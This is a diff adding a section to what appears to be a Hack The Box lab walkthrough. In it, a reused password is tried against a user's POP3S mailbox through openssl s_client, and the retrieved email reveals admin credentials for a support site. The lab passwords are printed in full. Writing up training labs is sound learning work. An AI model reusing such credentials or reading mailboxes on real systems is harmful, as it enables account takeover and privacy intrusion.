@@ -700,8 +700,58 @@ The same credential used for Kevin's account can now be tested against Sarah's m
 
 **Result:**
 
-```
+```shell
+┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
+└─$ openssl s_client -connect mail001.enigma.htb:995 -quiet << 'EOF'
+USER sarah
+PASS Enigma2024!
+LIST
+RETR 1
+QUIT
+EOF
+Connecting to 10.129.32.201
+depth=0 CN=enigma
+verify error:num=18:self-signed certificate
+verify return:1
+depth=0 CN=enigma
+verify return:1
++OK Dovecot (Ubuntu) ready.
++OK
++OK Logged in.
++OK 1 messages:
+1 838
+.
++OK 838 octets
+Return-Path: <it@enigma.htb>
+X-Original-To: sarah@localhost
+Delivered-To: sarah@localhost
+Received: from enigma (localhost [127.0.0.1])
+        by enigma (Postfix) with ESMTP id C123C211B9
+        for <sarah@localhost>; Wed, 18 Feb 2026 21:42:51 +0000 (UTC)
+Date: Thu, 19 Feb 2026 10:22:00 +0000
+Subject: Re: OpenSTAManager Access Request
+From: it@enigma.htb
+To: sarah@enigma.htb
+Message-Id: <osm-reply-001@enigma.htb>
+In-Reply-To: <osm-request-001@enigma.htb>
+References: <osm-request-001@enigma.htb>
 
+Hi Sarah,
+
+Apologies for the delay. I have provisioned your access. Please find the details below:
+
+URL: http://support_001.enigma.htb
+Username: admin
+Password: Ne3s4rtars78s
+
+Note: I will create a dedicated account for you shortly, for now you can use the admin account to get started.
+
+Regards,
+IT Support
+Enigma Corp
+
+.
++OK Logging out.
 ```
 <div align="center">
 <br>
